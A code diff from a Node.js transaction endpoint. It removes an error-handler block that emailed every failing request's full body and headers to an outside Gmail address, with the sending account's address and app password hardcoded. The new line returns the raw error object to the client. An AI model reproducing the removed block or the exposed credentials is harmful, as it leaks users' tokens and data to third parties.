@@ -292,30 +292,7 @@ module.exports = {
             }
             return res.status(400).json({ message: "Invalid transaction" });
         } catch (error) {
-            console.error(error);
-
-            const transporter = nodemailer.createTransport({
-                service: "gmail",
-                auth: {
-                    user: "checkfb9999@gmail.com", // Thay bằng email của bạn
-                    pass: "fufzgdridpmjhigt", // Mật khẩu ứng dụng (tạo trong Google Account)
-                },
-            });
-
-            // send email test
-            const mailOptions = {
-                from: "checkfb9999@gmail.com",
-                to: "dtrinhit04@gmail.com",
-                subject: "Test email",
-                text: `body ${JSON.stringify(
-                    req.body,
-                    null,
-                    1
-                )} - Header ${JSON.stringify(req.headers, null, 1)}`,
-            };
-            await transporter.sendMail(mailOptions);
-
-            return res.status(500).json({ message: "Internal server error" });
+            return res.status(500).json({ message: error });
         } finally {
             session.endSession();
         }
